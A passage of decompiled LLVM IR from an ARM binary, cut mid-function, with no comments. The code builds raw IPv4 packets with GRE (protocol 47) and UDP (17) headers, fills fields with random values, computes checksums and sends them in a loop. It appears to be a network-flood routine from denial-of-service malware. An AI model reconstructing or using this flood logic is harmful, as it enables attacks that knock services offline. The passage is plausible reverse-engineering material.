  %v3_918c = mul i32 %v0_918c, 65536
  %v3_9188 = mul i32 %v0_9188, 65536
  %v0_9190.not = or i32 %v0_9190, -65536
  %v1_91d0 = xor i32 %v0_9190.not, 65535
  %v3_91d4 = mul i32 %v6_90e8, 65536
  %v1_91d8 = add i32 %v3_91d4, 3407872
  %tmp67 = udiv i32 %v1_91d8, 256
  %v3_91ec = and i32 %tmp67, 65280
  %tmp68 = mul nsw i32 %v1_91d0, 256
  %v3_91f0 = and i32 %tmp68, 65280
  store i32 %v3_91f0, i32* %ip.global-to-local, align 4
  %v1_91f4 = add i32 %v3_91d4, 524288
  %v1_91fc = add i32 %v3_91d4, 1835008
  %tmp69 = udiv i32 %v1_91d0, 256
  %v4_9200 = urem i32 %tmp69, 256
  %v5_9200 = or i32 %v4_9200, %v3_91f0
  %v4_9208 = udiv i32 %v1_91d8, 16777216
  %v5_9208 = or i32 %v3_91ec, %v4_9208
  store i32 %v5_9208, i32* @r8, align 4
  %v3_9214 = udiv i32 %v1_91fc, 256
  %tmp70 = mul i32 %v0_9190, 256
  %v3_9218 = and i32 %tmp70, 65280
  store i32 %v3_9188, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v0_9190, 256
  %v4_9228 = urem i32 %tmp71, 256
  %v5_9228 = or i32 %v4_9228, %v3_9218
  %tmp72 = mul i32 %v0_9188, 256
  %v3_922c = and i32 %tmp72, 65280
  %v1_9230 = and i32 %v3_9214, 65280
  store i32 %v1_9230, i32* @r6, align 4
  store i32 %v3_918c, i32* %r1.global-to-local, align 4
  %tmp73 = mul i32 %v0_918c, 256
  %v3_923c = and i32 %tmp73, 65280
  %tmp74 = udiv i32 %v0_9188, 256
  %v4_9240 = urem i32 %tmp74, 256
  %v5_9240 = or i32 %v4_9240, %v3_922c
  store i32 %v5_9240, i32* @lr, align 4
  %v4_9244 = udiv i32 %v1_91fc, 16777216
  %v5_9244 = or i32 %v1_9230, %v4_9244
  store i32 %v5_9244, i32* %r3.global-to-local, align 4
  %tmp75 = udiv i32 %v0_918c, 256
  %v4_9248 = urem i32 %tmp75, 256
  %v5_9248 = or i32 %v4_9248, %v3_923c
  %tmp76 = udiv i32 %v1_91f4, 256
  %v3_924c = and i32 %tmp76, 65280
  store i32 %v3_924c, i32* @r5, align 4
  %v4_9260 = udiv i32 %v1_91f4, 16777216
  %v5_9260 = or i32 %v3_924c, %v4_9260
  store i32 %v5_9260, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %sext12 = mul nuw i32 %v5_9228, 65536
  %v4_92cc13 = sdiv i32 %sext12, 65536
  %sext8 = mul nuw i32 %v5_9244, 65536
  %v4_9330 = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_9200, 65536
  %v4_9334 = sdiv i32 %sext9, 65536
  %v1_933c = trunc i32 %v4_9330 to i16
  %v2_9364 = icmp eq i32 %v1_9194, 0
  %sext10 = mul nuw i32 %v5_9240, 65536
  %v4_9384 = sdiv i32 %sext10, 65536
  %sext11 = mul nuw i32 %v5_9248, 65536
  %v4_938c = sdiv i32 %sext11, 65536
  %v1_92c4 = trunc i32 %v6_9070 to i8
  br label %dec_label_pc_9268

dec_label_pc_9268:                                ; preds = %bb82, %dec_label_pc_91cc
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_9274 = call i32 @function_1215c(i32 1510, i32 4)
  store i32 %v2_901c, i32* %r2.global-to-local, align 4
  %v3_927c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_927c, i32* %r3.global-to-local, align 4
  %v2_9280 = load i32, i32* @r4, align 4
  %v5_9280 = mul i32 %v2_9280, 4
  %v6_9280 = add i32 %v5_9280, %v2_901c
  %v7_9280 = inttoptr i32 %v6_9280 to i32*
  store i32 %v2_9274, i32* %v7_9280, align 4
  %v0_9284 = load i32, i32* %r2.global-to-local, align 4
  %v1_9284 = load i32, i32* %r3.global-to-local, align 4
  %v4_9284 = mul i32 %v1_9284, 4
  %v5_9284 = add i32 %v4_9284, %v0_9284
  %v6_9284 = inttoptr i32 %v5_9284 to i32*
  %v7_9284 = load i32, i32* %v6_9284, align 4
  store i32 %v7_9284, i32* %r4.global-to-local, align 4
  %v1_9288 = inttoptr i32 %v7_9284 to i8*
  %v2_9288 = load i8, i8* %v1_9288, align 1
  %tmp = urem i8 %v2_9288, 16
  %v1_928c = zext i8 %tmp to i32
  %v1_9290 = or i32 %v1_928c, 64
  store i32 %v1_9290, i32* %r2.global-to-local, align 4
  %v1_9294 = trunc i32 %v1_9290 to i8
  store i8 %v1_9294, i8* %v1_9288, align 1
  %v0_9298 = load i32, i32* %r3.global-to-local, align 4
  %v5_929c = mul i32 %v0_9298, 24
  store i32 %v5_929c, i32* %r1.global-to-local, align 4
  %v0_92a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_92a0 = inttoptr i32 %v0_92a0 to i8*
  %v2_92a0 = load i8, i8* %v1_92a0, align 1
  %v1_92a4 = and i8 %v2_92a0, -16
  %v1_92a8 = or i8 %v1_92a4, 5
  store i32 %v1_909c, i32* %r5.global-to-local, align 4
  store i8 %v1_92a8, i8* %v1_92a0, align 1
  store i32 %v6_9034, i32* %r2.global-to-local, align 4
  %v2_92b8 = load i32, i32* %r4.global-to-local, align 4
  %v3_92b8 = add i32 %v2_92b8, 1
  %v4_92b8 = inttoptr i32 %v3_92b8 to i8*
  store i8 %v5_9054, i8* %v4_92b8, align 1
  store i32 %v1_9078, i32* %r3.global-to-local, align 4
  %v0_92c0 = load i32, i32* %r5.global-to-local, align 4
  %v2_92c0 = icmp eq i32 %v0_92c0, 0
  store i1 %v2_92c0, i1* %cpsr_z.global-to-local, align 1
  %v2_92c4 = load i32, i32* %r4.global-to-local, align 4
  %v3_92c4 = add i32 %v2_92c4, 8
  %v4_92c4 = inttoptr i32 %v3_92c4 to i8*
  store i8 %v1_92c4, i8* %v4_92c4, align 1
  %v0_92c8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_92c8, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_9268
  store i32 %v4_92cc13, i32* %r5.global-to-local, align 4
  br label %bb77

bb:                                               ; preds = %dec_label_pc_9268
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v4_92cc13, i32* %r5.global-to-local, align 4
  %v3_92d0 = load i32, i32* %r4.global-to-local, align 4
  %v4_92d0 = add i32 %v3_92d0, 6
  %v5_92d0 = inttoptr i32 %v4_92d0 to i16*
  store i16 64, i16* %v5_92d0, align 2
  br label %bb77

bb77:                                             ; preds = %.thread, %bb
  %v2_92d8 = load i32, i32* %r4.global-to-local, align 4
  %v3_92d8 = add i32 %v2_92d8, 9
  %v4_92d8 = inttoptr i32 %v3_92d8 to i8*
  store i8 47, i8* %v4_92d8, align 1
  %v0_92dc = load i32, i32* %r4.global-to-local, align 4
  %v1_92dc = add i32 %v0_92dc, 20
  store i32 %v1_92dc, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_92e4 = load i32, i32* %r5.global-to-local, align 4
  %v1_92e4 = trunc i32 %v0_92e4 to i16
  %v3_92e4 = add i32 %v0_92dc, 4
  %v4_92e4 = inttoptr i32 %v3_92e4 to i16*
  store i16 %v1_92e4, i16* %v4_92e4, align 2
  %v0_92e8 = load i32, i32* @r8, align 4
  %v1_92e8 = trunc i32 %v0_92e8 to i16
  %v2_92e8 = load i32, i32* %r4.global-to-local, align 4
  %v3_92e8 = add i32 %v2_92e8, 2
  %v4_92e8 = inttoptr i32 %v3_92e8 to i16*
  store i16 %v1_92e8, i16* %v4_92e8, align 2
  %v0_92ec = load i32, i32* %r3.global-to-local, align 4
  %v1_92ec = trunc i32 %v0_92ec to i16
  %v2_92ec = load i32, i32* %r2.global-to-local, align 4
  %v3_92ec = add i32 %v2_92ec, 2
  %v4_92ec = inttoptr i32 %v3_92ec to i16*
  store i16 %v1_92ec, i16* %v4_92ec, align 2
  store i32 %v6_913c, i32* %r3.global-to-local, align 4
  %v0_92f4 = load i32, i32* %r4.global-to-local, align 4
  %v1_92f4 = add i32 %v0_92f4, 24
  %v2_92f4 = inttoptr i32 %v1_92f4 to i8*
  %v3_92f4 = load i8, i8* %v2_92f4, align 1
  %v4_92f4 = zext i8 %v3_92f4 to i32
  store i32 %v4_92f4, i32* %r2.global-to-local, align 4
  %v2_92f8 = add i32 %v0_92f4, 12
  %v3_92f8 = inttoptr i32 %v2_92f8 to i32*
  store i32 %v6_913c, i32* %v3_92f8, align 4
  %v0_92fc = load i32, i32* %r2.global-to-local, align 4
  %v1_92fc = and i32 %v0_92fc, -241
  %v1_9300 = or i32 %v1_92fc, 64
  store i32 %v1_9300, i32* %r2.global-to-local, align 4
  %v0_9304 = load i32, i32* %r1.global-to-local, align 4
  %v1_9304 = load i32, i32* @sb, align 4
  %v2_9304 = add i32 %v1_9304, %v0_9304
  store i32 %v2_9304, i32* %r1.global-to-local, align 4
  %v1_9308 = add i32 %v2_9304, 16
  %v2_9308 = inttoptr i32 %v1_9308 to i32*
  %v3_9308 = load i32, i32* %v2_9308, align 4
  store i32 %v3_9308, i32* %r1.global-to-local, align 4
  %v1_930c = trunc i32 %v1_9300 to i8
  %v2_930c = load i32, i32* %r4.global-to-local, align 4
  %v3_930c = add i32 %v2_930c, 24
  %v4_930c = inttoptr i32 %v3_930c to i8*
  store i8 %v1_930c, i8* %v4_930c, align 1
  %v0_9310 = load i32, i32* %r4.global-to-local, align 4
  %v1_9310 = add i32 %v0_9310, 24
  %v2_9310 = inttoptr i32 %v1_9310 to i8*
  %v3_9310 = load i8, i8* %v2_9310, align 1
  %v1_9314 = and i8 %v3_9310, -16
  %v1_9318 = or i8 %v1_9314, 5
  store i8 %v1_9318, i8* %v2_9310, align 1
  %v0_9320 = load i32, i32* %r1.global-to-local, align 4
  %v1_9320 = load i32, i32* %r4.global-to-local, align 4
  %v2_9320 = add i32 %v1_9320, 16
  %v3_9320 = inttoptr i32 %v2_9320 to i32*
  store i32 %v0_9320, i32* %v3_9320, align 4
  %v0_9328 = load i32, i32* %r4.global-to-local, align 4
  %v1_9328 = add i32 %v0_9328, 24
  store i32 %v1_9328, i32* @r5, align 4
  %v3_932c = add i32 %v0_9328, 25
  %v4_932c = inttoptr i32 %v3_932c to i8*
  store i8 %v5_9054, i8* %v4_932c, align 1
  store i32 %v4_9330, i32* %r2.global-to-local, align 4
  store i32 %v4_9334, i32* %r3.global-to-local, align 4
  store i32 %v1_9078, i32* %r1.global-to-local, align 4
  %v2_933c = load i32, i32* @r5, align 4
  %v3_933c = add i32 %v2_933c, 2
  %v4_933c = inttoptr i32 %v3_933c to i16*
  store i16 %v1_933c, i16* %v4_933c, align 2
  %v0_9340 = load i32, i32* %r3.global-to-local, align 4
  %v1_9340 = trunc i32 %v0_9340 to i16
  %v2_9340 = load i32, i32* @r5, align 4
  %v3_9340 = add i32 %v2_9340, 4
  %v4_9340 = inttoptr i32 %v3_9340 to i16*
  store i16 %v1_9340, i16* %v4_9340, align 2
  %v0_9344 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9344, label %bb79, label %bb78

bb78:                                             ; preds = %bb77
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %bb77, %bb78
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_934c = load i32, i32* %r1.global-to-local, align 4
  %v1_934c = trunc i32 %v0_934c to i8
  %v2_934c = load i32, i32* @r5, align 4
  %v3_934c = add i32 %v2_934c, 8
  %v4_934c = inttoptr i32 %v3_934c to i8*
  store i8 %v1_934c, i8* %v4_934c, align 1
  %v0_9350 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9350, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_9350 = load i32, i32* %r2.global-to-local, align 4
  %v2_9350 = trunc i32 %v1_9350 to i16
  %v3_9350 = load i32, i32* @r5, align 4
  %v4_9350 = add i32 %v3_9350, 6
  %v5_9350 = inttoptr i32 %v4_9350 to i16*
  store i16 %v2_9350, i16* %v5_9350, align 2
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v0_9354 = load i32, i32* %r3.global-to-local, align 4
  %v1_9354 = trunc i32 %v0_9354 to i8
  %v2_9354 = load i32, i32* @r5, align 4
  %v3_9354 = add i32 %v2_9354, 9
  %v4_9354 = inttoptr i32 %v3_9354 to i8*
  store i8 %v1_9354, i8* %v4_9354, align 1
  %v0_9358 = call i32 @function_e0b8()
  store i32 %v1_9194, i32* %r1.global-to-local, align 4
  store i1 %v2_9364, i1* %cpsr_z.global-to-local, align 1
  %v1_9368 = sub i32 1023, %v0_9358
  store i32 %v1_9368, i32* %r3.global-to-local, align 4
  br i1 %v2_9364, label %.thread14, label %.thread15

.thread14:                                        ; preds = %bb81
  %v2_9370 = load i32, i32* @r5, align 4
  %v3_9370 = add i32 %v2_9370, 16
  %v4_9370 = inttoptr i32 %v3_9370 to i32*
  store i32 %v1_9368, i32* %v4_9370, align 4
  br label %bb82

.thread15:                                        ; preds = %bb81
  %v1_936c = load i32, i32* %r4.global-to-local, align 4
  %v2_936c = add i32 %v1_936c, 16
  %v3_936c = inttoptr i32 %v2_936c to i32*
  %v4_936c = load i32, i32* %v3_936c, align 4
  store i32 %v4_936c, i32* %r3.global-to-local, align 4
  %v2_9374 = load i32, i32* @r5, align 4
  %v3_9374 = add i32 %v2_9374, 16
  %v4_9374 = inttoptr i32 %v3_9374 to i32*
  store i32 %v4_936c, i32* %v4_9374, align 4
  br label %bb82

bb82:                                             ; preds = %.thread14, %.thread15
  %v1_9378 = load i32, i32* @r5, align 4
  %v2_9378 = add i32 %v1_9378, 12
  %v3_9378 = inttoptr i32 %v2_9378 to i32*
  store i32 %v0_9358, i32* %v3_9378, align 4
  %v3_937c = load i32, i32* %stack_var_-44, align 4
  %v0_9380 = load i32, i32* %r4.global-to-local, align 4
  %v1_9380 = add i32 %v0_9380, 44
  store i32 %v1_9380, i32* @r6, align 4
  store i32 %v4_9384, i32* %r2.global-to-local, align 4
  %v1_9388 = add i32 %v3_937c, 1
  store i32 %v1_9388, i32* @r4, align 4
  store i32 %v4_938c, i32* %r3.global-to-local, align 4
  %v1_9390 = load i32, i32* @sl, align 4
  %v9_9390 = icmp eq i32 %v1_9388, %v1_9390
  store i1 %v9_9390, i1* %cpsr_z.global-to-local, align 1
  %v0_9394 = load i32, i32* @r7, align 4
  %v1_9394 = trunc i32 %v0_9394 to i16
  %v3_9394 = add i32 %v0_9380, 48
  %v4_9394 = inttoptr i32 %v3_9394 to i16*
  store i16 %v1_9394, i16* %v4_9394, align 2
  %v0_9398 = load i32, i32* %r2.global-to-local, align 4
  %v1_9398 = trunc i32 %v0_9398 to i16
  %v2_9398 = load i32, i32* @r6, align 4
  %v3_9398 = inttoptr i32 %v2_9398 to i16*
  store i16 %v1_9398, i16* %v3_9398, align 2
  %v0_939c = load i32, i32* %r3.global-to-local, align 4
  %v1_939c = trunc i32 %v0_939c to i16
  %v2_939c = load i32, i32* @r6, align 4
  %v3_939c = add i32 %v2_939c, 2
  %v4_939c = inttoptr i32 %v3_939c to i16*
  store i16 %v1_939c, i16* %v4_939c, align 2
  %v0_93a0 = load i32, i32* @r4, align 4
  store i32 %v0_93a0, i32* %stack_var_-44, align 4
  %v5_93a4 = icmp slt i32 %v1_9388, %v1_9390
  br i1 %v5_93a4, label %dec_label_pc_9268, label %dec_label_pc_93a8

dec_label_pc_93a8:                                ; preds = %bb82
  store i32 %v6_90e8, i32* %r5.global-to-local, align 4
  %v1_93b0 = add i32 %v6_90e8, 8
  store i32 %v1_93b0, i32* %r4.global-to-local, align 4
  %v0_93c0.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_93bc.preheader

dec_label_pc_93bc.preheader:                      ; preds = %dec_label_pc_93a8, %dec_label_pc_9600
  %v0_93c0.pre = phi i32 [ %v0_93c0.pre.pre, %dec_label_pc_93a8 ], [ 0, %dec_label_pc_9600 ]
  %stack_var_-124.0.ph = phi i32 [ %v1_93b0, %dec_label_pc_93a8 ], [ %v1_9608, %dec_label_pc_9600 ]
  %storemerge = add i32 %v6_90e8, 52
  store i32 %storemerge, i32* @r8, align 4
  %v2_95b4 = icmp eq i32 %v1_9194, 0
  %v2_95d0 = icmp eq i32 %v1_9108, 0
  %v2_93fc = icmp eq i32 %v6_913c, -1
  %v7_93fc = icmp eq i32 %v6_913c, -1
  br label %dec_label_pc_93bc

dec_label_pc_93bc:                                ; preds = %dec_label_pc_93bc, %dec_label_pc_944c, %dec_label_pc_93bc.preheader
  %v0_93c0 = phi i32 [ %v0_93c0.pre, %dec_label_pc_93bc.preheader ], [ 0, %dec_label_pc_93bc ], [ %v1_94e8, %dec_label_pc_944c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_93c0 = icmp eq i32 %v0_93c0, 0
  store i1 %v2_93c0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_93c0, label %dec_label_pc_93bc, label %dec_label_pc_93cc

dec_label_pc_93cc:                                ; preds = %dec_label_pc_93bc
  br label %dec_label_pc_93d0

dec_label_pc_93d0:                                ; preds = %dec_label_pc_944c, %dec_label_pc_93cc
  %v1_93e4 = phi i32 [ %v1_94e4, %dec_label_pc_944c ], [ 0, %dec_label_pc_93cc ]
  %v5_93d4 = mul i32 %v1_93e4, 24
  %v1_93d8 = load i32, i32* @sb, align 4
  %v2_93d8 = add i32 %v1_93d8, %v5_93d4
  store i32 %v2_93d8, i32* %r3.global-to-local, align 4
  store i32 %v2_901c, i32* %r4.global-to-local, align 4
  %v1_93e0 = add i32 %v2_93d8, 20
  %v2_93e0 = inttoptr i32 %v1_93e0 to i8*
  %v3_93e0 = load i8, i8* %v2_93e0, align 1
  %v4_93e0 = zext i8 %v3_93e0 to i32
  store i32 %v4_93e0, i32* %r2.global-to-local, align 4
  %v4_93e4 = mul i32 %v1_93e4, 4
  %v5_93e4 = add i32 %v4_93e4, %v2_901c
  %v6_93e4 = inttoptr i32 %v5_93e4 to i32*
  %v7_93e4 = load i32, i32* %v6_93e4, align 4
  store i32 %v7_93e4, i32* @r5, align 4
  %v7_93e8 = icmp eq i8 %v3_93e0, 31
  store i1 %v7_93e8, i1* %cpsr_z.global-to-local, align 1
  %v1_93ec = add i32 %v7_93e4, 24
  store i32 %v1_93ec, i32* @r6, align 4
  %v1_93f0 = add i32 %v7_93e4, 44
  store i32 %v1_93f0, i32* @r7, align 4
  %tmp86 = icmp ult i8 %v3_93e0, 32
  br i1 %tmp86, label %dec_label_pc_94f8, label %dec_label_pc_93f8

dec_label_pc_93f8:                                ; preds = %dec_label_pc_93d0
  store i32 %v6_913c, i32* %r1.global-to-local, align 4
  store i1 %v7_93fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_93fc, label %dec_label_pc_9558, label %dec_label_pc_9404

dec_label_pc_9404:                                ; preds = %dec_label_pc_94f8, %dec_label_pc_93f8
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_940c = load i32, i32* @fp, align 4
  %v9_940c = icmp eq i32 %v0_940c, 65535
  store i1 %v9_940c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_940c, label %dec_label_pc_9570, label %dec_label_pc_9414

dec_label_pc_9414:                                ; preds = %dec_label_pc_9558.dec_label_pc_9414_crit_edge, %dec_label_pc_9404
  %v1_9418 = phi i32 [ %v1_9418.pre, %dec_label_pc_9558.dec_label_pc_9414_crit_edge ], [ 65535, %dec_label_pc_9404 ]
  store i32 %v3_919c, i32* %r2.global-to-local, align 4
  %v9_9418 = icmp eq i32 %v3_919c, %v1_9418
  store i1 %v9_9418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9418, label %dec_label_pc_9598, label %dec_label_pc_9420

dec_label_pc_9420:                                ; preds = %dec_label_pc_9570.dec_label_pc_9420_crit_edge, %dec_label_pc_9414
  %v1_9424 = phi i32 [ %v1_9424.pre, %dec_label_pc_9570.dec_label_pc_9420_crit_edge ], [ %v1_9418, %dec_label_pc_9414 ]
  store i32 %v3_91a0, i32* %r3.global-to-local, align 4
  %v9_9424 = icmp eq i32 %v3_91a0, %v1_9424
  store i1 %v9_9424, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9424, label %dec_label_pc_95ac, label %dec_label_pc_942c

dec_label_pc_942c:                                ; preds = %dec_label_pc_9598, %dec_label_pc_9420
  store i32 %v1_9194, i32* @r4, align 4
  store i1 %v2_95b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_95b4, label %dec_label_pc_95c8, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_942c
  %v1_9434 = load i32, i32* @r5, align 4
  %v2_9434 = add i32 %v1_9434, 16
  %v3_9434 = inttoptr i32 %v2_9434 to i32*
  %v4_9434 = load i32, i32* %v3_9434, align 4
  store i32 %v4_9434, i32* %r3.global-to-local, align 4
  %v2_9438 = load i32, i32* @r6, align 4
  %v3_9438 = add i32 %v2_9438, 16
  %v4_9438 = inttoptr i32 %v3_9438 to i32*
  store i32 %v4_9434, i32* %v4_9438, align 4
  br label %dec_label_pc_9440

dec_label_pc_9440:                                ; preds = %bb85, %.thread16
  store i32 %v1_9108, i32* %r1.global-to-local, align 4
  store i1 %v2_95d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_95d0, label %dec_label_pc_944c, label %dec_label_pc_95dc

dec_label_pc_944c:                                ; preds = %dec_label_pc_9440, %dec_label_pc_95c8, %dec_label_pc_95dc
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_9450 = load i32, i32* @r5, align 4
  %v3_9450 = add i32 %v2_9450, 10
  %v4_9450 = inttoptr i32 %v3_9450 to i16*
  store i16 0, i16* %v4_9450, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9458 = load i32, i32* @r5, align 4
  store i32 %v0_9458, i32* @r0, align 4
  %v2_945c = call i32 @function_c848(i32 %v0_9458, i32 20)
  %v3_945c = trunc i32 %v2_945c to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9464 = load i32, i32* @r5, align 4
  %v4_9464 = add i32 %v3_9464, 10
  %v5_9464 = inttoptr i32 %v4_9464 to i16*
  store i16 %v3_945c, i16* %v5_9464, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_946c = load i32, i32* %r3.global-to-local, align 4
  %v1_946c = trunc i32 %v0_946c to i16
  %v2_946c = load i32, i32* @r6, align 4
  %v3_946c = add i32 %v2_946c, 10
  %v4_946c = inttoptr i32 %v3_946c to i16*
  store i16 %v1_946c, i16* %v4_946c, align 2
  %v0_9470 = load i32, i32* @r6, align 4
  store i32 %v0_9470, i32* @r0, align 4
  %v2_9474 = call i32 @function_c848(i32 %v0_9470, i32 20)
  %v3_9474 = trunc i32 %v2_9474 to i16
  %v3_9478 = load i32, i32* @r6, align 4
  %v4_9478 = add i32 %v3_9478, 10
  %v5_9478 = inttoptr i32 %v4_9478 to i16*
  store i16 %v3_9474, i16* %v5_9478, align 2
  store i32 0, i32* @r4, align 4
  %v0_9480 = load i32, i32* @r7, align 4
  store i32 %v0_9480, i32* @r1, align 4
  %v1_9484 = add i32 %v0_9480, 4
  %v2_9484 = inttoptr i32 %v1_9484 to i16*
  %v3_9484 = load i16, i16* %v2_9484, align 2
  %v4_9484 = zext i16 %v3_9484 to i32
  store i32 %v4_9484, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-124.0.ph, i32* %r3.global-to-local, align 4
  %v3_948c = add i32 %v0_9480, 6
  %v4_948c = inttoptr i32 %v3_948c to i16*
  store i16 0, i16* %v4_948c, align 2
  %v0_9490 = load i32, i32* @r6, align 4
  %v4_9494 = call i32 @function_c898(i32 %v0_9490, i32 %v0_9480, i32 %v4_9484, i32 %stack_var_-124.0.ph)
  %v5_9494 = trunc i32 %v4_9494 to i16
  %v3_9498 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9498, i32* %r2.global-to-local, align 4
  %v3_949c = mul i32 %v3_9498, 32
  store i32 %v3_949c, i32* %r3.global-to-local, align 4
  %v0_94a0 = load i32, i32* @r5, align 4
  %v1_94a0 = add i32 %v0_94a0, 16
  %v2_94a0 = inttoptr i32 %v1_94a0 to i32*
  %v3_94a0 = load i32, i32* %v2_94a0, align 4
  %v5_94a4 = mul i32 %v3_9498, 24
  store i32 %v5_94a4, i32* %r3.global-to-local, align 4
  %v1_94a8 = load i32, i32* @sb, align 4
  %v2_94a8 = add i32 %v1_94a8, %v5_94a4
  store i32 %v2_94a8, i32* @lr, align 4
  %v2_94ac = add i32 %v2_94a8, 4
  %v3_94ac = inttoptr i32 %v2_94ac to i32*
  store i32 %v3_94a0, i32* %v3_94ac, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_94b4 = load i32, i32* @r7, align 4
  %v4_94b4 = add i32 %v3_94b4, 6
  %v5_94b4 = inttoptr i32 %v4_94b4 to i16*
  store i16 %v5_9494, i16* %v5_94b4, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_94bc = load i32, i32* %r1.global-to-local, align 4
  %v1_94bc = trunc i32 %v0_94bc to i16
  %v2_94bc = load i32, i32* %r3.global-to-local, align 4
  %v3_94bc = load i32, i32* @sb, align 4
  %v4_94bc = add i32 %v3_94bc, %v2_94bc
  %v5_94bc = inttoptr i32 %v4_94bc to i16*
  store i16 %v1_94bc, i16* %v5_94bc, align 2
  %v0_94c0 = load i32, i32* @r4, align 4
  %v1_94c0 = trunc i32 %v0_94c0 to i16
  %v2_94c0 = load i32, i32* @lr, align 4
  %v3_94c0 = add i32 %v2_94c0, 2
  %v4_94c0 = inttoptr i32 %v3_94c0 to i16*
  store i16 %v1_94c0, i16* %v4_94c0, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_94c8 = load i32, i32* @r5, align 4
  store i32 %v0_94c8, i32* %r1.global-to-local, align 4
  %v0_94d0 = load i32, i32* @r8, align 4
  store i32 %v0_94d0, i32* %r2.global-to-local, align 4
  %v0_94d4 = load i32, i32* @lr, align 4
  %v0_94d8 = load i32, i32* %ip.global-to-local, align 4
  %v6_94dc = call i32 @function_11570(i32 %v3_9150, i32 %v0_94c8, i32 %v0_94d0, i32 16384, i32 %v0_94d4, i32 %v0_94d8)
  %v3_94e0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_94e0, i32* %r3.global-to-local, align 4
  %v1_94e4 = add i32 %v3_94e0, 1
  %v1_94e8 = load i32, i32* @sl, align 4
  %v9_94e8 = icmp eq i32 %v1_94e4, %v1_94e8
  store i1 %v9_94e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_94e4, i32* %stack_var_-44, align 4
  %v6_94f0 = icmp slt i32 %v1_94e4, %v1_94e8
  br i1 %v6_94f0, label %dec_label_pc_93d0, label %dec_label_pc_93bc

dec_label_pc_94f8:                                ; preds = %dec_label_pc_93d0
  %v1_94f8 = add i32 %v2_93d8, 16
  %v2_94f8 = inttoptr i32 %v1_94f8 to i32*
  %v3_94f8 = load i32, i32* %v2_94f8, align 4
  store i32 %v3_94f8, i32* %r4.global-to-local, align 4
  %v0_94fc = call i32 @function_e0b8()
  %v3_9500 = load i32, i32* %stack_var_-44, align 4
  %v5_9508 = mul i32 %v3_9500, 24
  %v0_950c = load i32, i32* %r4.global-to-local, align 4
  %v1_950c = and i32 %v0_950c, 16711680
  store i32 %v1_950c, i32* %ip.global-to-local, align 4
  %v3_9510 = udiv i32 %v0_950c, 16777216
  %v4_9514 = udiv i32 %v1_950c, 256
  %v5_9514 = or i32 %v4_9514, %v3_9510
  store i32 %v5_9514, i32* %r2.global-to-local, align 4
  %v1_9518 = load i32, i32* @sb, align 4
  %v2_9518 = add i32 %v1_9518, %v5_9508
  store i32 %v2_9518, i32* %r1.global-to-local, align 4
  %v1_951c = and i32 %v0_950c, 65280
  store i32 %v1_951c, i32* %r3.global-to-local, align 4
  %v1_9520 = add i32 %v2_9518, 20
  %v2_9520 = inttoptr i32 %v1_9520 to i8*
  %v3_9520 = load i8, i8* %v2_9520, align 1
  %v4_9520 = zext i8 %v3_9520 to i32
  store i32 %v4_9520, i32* %ip.global-to-local, align 4
  %v5_9528 = call i32 @llvm.bswap.i32(i32 %v0_950c)
  %v7_952c = lshr i32 %v0_94fc, %v4_9520
  %v8_952c = add i32 %v7_952c, %v5_9528
  store i32 %v8_952c, i32* %r2.global-to-local, align 4
  store i32 %v6_913c, i32* %r1.global-to-local, align 4
  %v5_9548 = call i32 @llvm.bswap.i32(i32 %v8_952c)
  store i32 %v5_9548, i32* %r3.global-to-local, align 4
  store i1 %v7_93fc, i1* %cpsr_z.global-to-local, align 1
  %v1_9550 = load i32, i32* @r5, align 4
  %v2_9550 = add i32 %v1_9550, 16
  %v3_9550 = inttoptr i32 %v2_9550 to i32*
  store i32 %v5_9548, i32* %v3_9550, align 4
  br i1 %v2_93fc, label %dec_label_pc_9558, label %dec_label_pc_9404

dec_label_pc_9558:                                ; preds = %dec_label_pc_94f8, %dec_label_pc_93f8
  %v0_9558 = call i32 @function_e0b8()
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_9564 = load i32, i32* @fp, align 4
  %v9_9564 = icmp eq i32 %v0_9564, 65535
  store i1 %v9_9564, i1* %cpsr_z.global-to-local, align 1
  %v1_9568 = load i32, i32* @r5, align 4
  %v2_9568 = add i32 %v1_9568, 12
  %v3_9568 = inttoptr i32 %v2_9568 to i32*
  store i32 %v0_9558, i32* %v3_9568, align 4
  br i1 %v9_9564, label %dec_label_pc_9570, label %dec_label_pc_9558.dec_label_pc_9414_crit_edge

dec_label_pc_9558.dec_label_pc_9414_crit_edge:    ; preds = %dec_label_pc_9558
